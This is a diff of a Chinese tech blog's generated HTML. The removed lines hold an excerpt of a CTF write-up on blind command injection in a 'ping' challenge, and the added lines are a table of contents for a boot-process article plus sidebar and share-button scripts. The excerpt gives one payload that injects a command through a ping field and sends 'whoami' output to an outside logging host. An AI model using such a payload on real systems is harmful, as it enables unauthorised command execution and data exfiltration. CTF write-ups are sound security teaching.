-        <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>这道题着重点在于没有回显的命令执行，waf也侧重在于防止反弹shell，一般的命令没有过滤。对于没有回显的命令执行一般可以通过<code>DNS通道/HTTP通道</code>和<code>反弹shell</code>。</p>
-<h1 id="0x01-DNS通道-HTTP通道"><a href="#0x01-DNS通道-HTTP通道" class="headerlink" title="0x01 DNS通道/HTTP通道"></a>0x01 DNS通道/HTTP通道</h1><p>post ip=0.0.0.0|curl <em>*</em>.ceye.io/`whoami`，在ceye那个网站可以看到有返回消息(Linux在命令参数执行命令的有`` 和$()两种，这里()被过滤)<br><img src="http://upload-images.jianshu.io/upload_images/5443560-c408e1c41f14c7e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>
-        
-        
-        <p class="article-more-link">
-          
-            <a href="/2018/02/15/happyMoctf-ping一下好吗WP/#more">Read More</a>
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-<div class="article-catetags">
-
-<div class="article-categories">
-  <span></span>
-  <a class="article-category-link" href="/categories/ctf/">ctf</a>
-</div>
-
-
-  <div class="article-tags">
-  
-  <span></span> <a href="/tags/ctf/">ctf</a><a href="/tags/Web/">Web</a><a href="/tags/漏洞研究/">漏洞研究</a>
-  </div>
-
-</div>
-
-
-
-
-<div class="comments-count">
-	
-	  	<span></span>
-		<a href="/2018/02/15/happyMoctf-ping一下好吗WP/#comments" class="ds-thread-count comments-count-link" data-thread-key="2018/02/15/happyMoctf-ping一下好吗WP/" data-count-type="comments">&nbsp;</a>
-	
-</div>
-
-</footer>
-
-
-    </article>
-
-
-
-
-
-
-
-  <nav id="page-nav" class="clearfix">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next<span></span></a>
-  </nav>
-
-</div>
+</div>  
       <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">Contents</strong>
+ 
+ <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-大体流程"><span class="toc-number">1.</span> <span class="toc-text"><a href="#0x00-&#x5927;&#x4F53;&#x6D41;&#x7A0B;" class="headerlink" title="0x00 &#x5927;&#x4F53;&#x6D41;&#x7A0B;"></a>0x00 &#x5927;&#x4F53;&#x6D41;&#x7A0B;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-bios做了什么"><span class="toc-number">2.</span> <span class="toc-text"><a href="#0x01-bios&#x505A;&#x4E86;&#x4EC0;&#x4E48;" class="headerlink" title="0x01 bios&#x505A;&#x4E86;&#x4EC0;&#x4E48;"></a>0x01 bios&#x505A;&#x4E86;&#x4EC0;&#x4E48;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-将随后的4个扇区加载进内存"><span class="toc-number">3.</span> <span class="toc-text"><a href="#0x02-&#x5C06;&#x968F;&#x540E;&#x7684;4&#x4E2A;&#x6247;&#x533A;&#x52A0;&#x8F7D;&#x8FDB;&#x5185;&#x5B58;" class="headerlink" title="0x02 &#x5C06;&#x968F;&#x540E;&#x7684;4&#x4E2A;&#x6247;&#x533A;&#x52A0;&#x8F7D;&#x8FDB;&#x5185;&#x5B58;"></a>0x02 &#x5C06;&#x968F;&#x540E;&#x7684;4&#x4E2A;&#x6247;&#x533A;&#x52A0;&#x8F7D;&#x8FDB;&#x5185;&#x5B58;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-将后面的240个扇区加载进内存"><span class="toc-number">4.</span> <span class="toc-text"><a href="#0x03-&#x5C06;&#x540E;&#x9762;&#x7684;240&#x4E2A;&#x6247;&#x533A;&#x52A0;&#x8F7D;&#x8FDB;&#x5185;&#x5B58;" class="headerlink" title="0x03 &#x5C06;&#x540E;&#x9762;&#x7684;240&#x4E2A;&#x6247;&#x533A;&#x52A0;&#x8F7D;&#x8FDB;&#x5185;&#x5B58;"></a>0x03 &#x5C06;&#x540E;&#x9762;&#x7684;240&#x4E2A;&#x6247;&#x533A;&#x52A0;&#x8F7D;&#x8FDB;&#x5185;&#x5B58;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-确认下根设备号"><span class="toc-number">5.</span> <span class="toc-text"><a href="#0x04-&#x786E;&#x8BA4;&#x4E0B;&#x6839;&#x8BBE;&#x5907;&#x53F7;" class="headerlink" title="0x04 &#x786E;&#x8BA4;&#x4E0B;&#x6839;&#x8BBE;&#x5907;&#x53F7;"></a>0x04 &#x786E;&#x8BA4;&#x4E0B;&#x6839;&#x8BBE;&#x5907;&#x53F7;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-将程序控制权转交给setup-s"><span class="toc-number">6.</span> <span class="toc-text"><a href="#0x05-&#x5C06;&#x7A0B;&#x5E8F;&#x63A7;&#x5236;&#x6743;&#x8F6C;&#x4EA4;&#x7ED9;setup-s" class="headerlink" title="0x05 &#x5C06;&#x7A0B;&#x5E8F;&#x63A7;&#x5236;&#x6743;&#x8F6C;&#x4EA4;&#x7ED9;setup.s"></a>0x05 &#x5C06;&#x7A0B;&#x5E8F;&#x63A7;&#x5236;&#x6743;&#x8F6C;&#x4EA4;&#x7ED9;setup.s</span></a></li></ol>
+ 
+  </div>
 
 <div id="asidepart">
 <div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
@@ -654,14 +402,103 @@ $(document).ready(function(){
       m.removeClass('moveMain');
       a.css('display', 'block').removeClass('fadeOut');
       o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
         
     }
   });
 });
 </script>
 
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
 
 
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<div class="hoverqrcode clearfix"></div>',
+  '<a class="overlay" id="qrcode"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+
+  $('.hoverqrcode').hide();
+
+  var myWidth = 0;
+  function updatehoverqrcode(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+    var qrsize = myWidth > 1024 ? 200:100;
+    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
+    var p = $('.article-share-qrcode').position();
+    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
+                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
+                          .qrcode(options);
+  };
+  $(window).resize(function(){
+    $('.hoverqrcode').hide();
+  });
+  $('.article-share-qrcode').click(function(){
+    updatehoverqrcode();
+    $('.hoverqrcode').toggle();
+  });
+  $('.article-share-qrcode').hover(function(){}, function(){
+      $('.hoverqrcode').hide();
+  });
+});   
+</script>
+
+
+
+<script type="text/javascript">
+  var duoshuoQuery = {short_name:"嘟嘟MD"};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0] 
+    || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+</script> 
 
 
 
@@ -761,4 +598,4 @@ var _hmt = _hmt || [];
 <!-- Tiny_search End -->
 
   </body>
- </html>
+</html>
